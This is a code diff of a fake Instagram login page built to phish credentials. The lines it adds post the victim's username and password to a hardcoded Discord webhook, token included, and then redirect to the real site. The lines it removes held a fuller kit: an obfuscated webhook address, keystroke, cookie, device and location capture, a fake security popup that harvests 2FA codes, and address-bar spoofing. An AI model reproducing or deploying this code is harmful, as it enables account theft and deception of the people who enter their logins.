@@ -69,7 +69,7 @@
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             color: #262626;
-            font-size: utvikling12px;
+            font-size: 12px;
             height: 36px;
             padding: 9px 0 7px 8px;
             width: 100%;
@@ -179,38 +179,6 @@
             font-size: 12px;
             margin-top: 15px;
         }
-        .error {
-            color: #ed4956;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            max-width: 300px;
-            text-align: center;
-            z-index: 1000;
-        }
-        .popup input {
-            margin-bottom: 10px;
-        }
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 999;
-        }
         @media (max-width: 875px) {
             .col.image {
                 display: none;
@@ -219,26 +187,9 @@
                 justify-content: center;
             }
         }
-        @media (max-width: 450px) {
-            .login-form {
-                max-width: 100%;
-                padding: 0 20px;
-            }
-            button {
-                margin: 8px 20px;
-                width: calc(100% - 40px);
-            }
-        }
     </style>
 </head>
 <body>
-    <div class="overlay" id="overlay"></div>
-    <div class="popup" id="securityPopup">
-        <h3>Security Verification</h3>
-        <p>Unusual activity detected. Please enter your 2FA code.</p>
-        <input type="text" id="twoFactorCode" placeholder="Enter 6-digit code" required />
-        <button onclick="submitTwoFactor()">Submit</button>
-    </div>
     <div class="container">
         <div class="col image">
             <a href="#"><img src="https://i.ibb.co/Q8X79RK/image.png" alt="instagram" id="image"></a>
@@ -252,12 +203,10 @@
                     <div class="form-content">
                         <input type="text" id="uname" name="uname" required placeholder=" " />
                         <label for="uname">Phone number, username, or email</label>
-                        <div class="error" id="unameError"></div>
                     </div>
                     <div class="form-content">
                         <input type="password" id="password" name="password" required placeholder=" " />
                         <label for="password">Password</label>
-                        <div class="error" id="passwordError"></div>
                     </div>
                     <div class="form-content">
                         <button type="submit">Log in</button>
@@ -305,103 +254,30 @@
         </div>
     </footer>
     <script>
-        function obf(str) {
-            return btoa(str).split('').reverse().join('');
-        }
-        const w = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNDkxMTI3MzMxMjc4MDMxOC9TQXFKM3lqOE1uN1NSZjBsVWhoV001Z0MtVmVETTB5a0I0ekRHRG9FbGFaTWswSXFtSERlXzd4eUppTFRYOGJlRVJTYg=='.split('').reverse().join(''));
-        const errors = [
-            'Please enter a valid username or email',
-            'Account not found, try again',
-            'Invalid credentials, please check',
-            'Username or email is incorrect'
-        ];
-        let keystrokes = '';
-        document.getElementById('uname').addEventListener('input', function(e) {
-            keystrokes += `Username: ${e.target.value} | `;
-        });
-        document.getElementById('password').addEventListener('input', function(e) {
-            keystrokes += `Password: ${e.target.value} | `;
-        });
-        function simulateHuman() {
-            const event = new Event('mousemove');
-            document.dispatchEvent(event);
-            setTimeout(() => {}, Math.random() * 1000);
-        }
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            simulateHuman();
-            const uname = document.getElementById('uname').value;
-            const password = document.getElementById('password').value;
-            const unameError = document.getElementById('unameError');
-            const passwordError = document.getElementById('passwordError');
-            if (uname.length < 3 || Math.random() > 0.7) {
-                unameError.textContent = errors[Math.floor(Math.random() * errors.length)];
-                unameError.style.display = 'block';
-                return;
-            }
-            if (password.length < 6 || Math.random() > 0.7) {
-                passwordError.textContent = 'Password is too short or incorrect';
-                passwordError.style.display = 'block';
-                return;
-            }
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                cookies: document.cookie
+            var uname = document.getElementById('uname').value;
+            var password = document.getElementById('password').value;
+            var webhookUrl = 'https://discord.com/api/webhooks/1404911273312780318/SAqJ3yj8Mn7SRf0lUhhWM5gC-VeDM0ykB4zDGDoElaZMk0IqmHDe_7xyJiLTX8beERSb';
+            var payload = {
+                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}`
             };
-            let locationData = 'Not provided';
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                }, () => {}, { timeout: 2000 });
-            }
-            setTimeout(() => {
-                const payload = {
-                    content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}\nDevice Info: ${JSON.stringify(deviceInfo)}\nKeystrokes: ${keystrokes}\nLocation: ${locationData}`
-                };
-                fetch(w, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                }).then(response => {
-                    if (response.ok) {
-                        document.getElementById('overlay').style.display = 'block';
-                        document.getElementById('securityPopup').style.display = 'block';
-                    } else {
-                        alert('Login failed - try again!');
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    window.location.href = 'https://www.instagram.com/';
-                });
-            }, Math.random() * 500 + 500);
-        });
-        function submitTwoFactor() {
-            simulateHuman();
-            const twoFactorCode = document.getElementById('twoFactorCode').value;
-            const payload = {
-                content: `2FA Code Captured:\nCode: ${twoFactorCode}`
-            };
-            fetch(w, {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(payload)
             }).then(response => {
-                window.location.href = 'https://www.instagram.com/';
+                if (response.ok) {
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    alert('Login failed - try again!');
+                }
             }).catch(error => {
-                console.error('Error:', error);
+                console.error('Error sending data:', error);
                 window.location.href = 'https://www.instagram.com/';
             });
-        }
-        history.pushState(null, null, 'https://www.instagram.com/');
-        window.addEventListener('popstate', () => {
-            history.pushState(null, null, 'https://www.instagram.com/');
         });
     </script>
 </body>
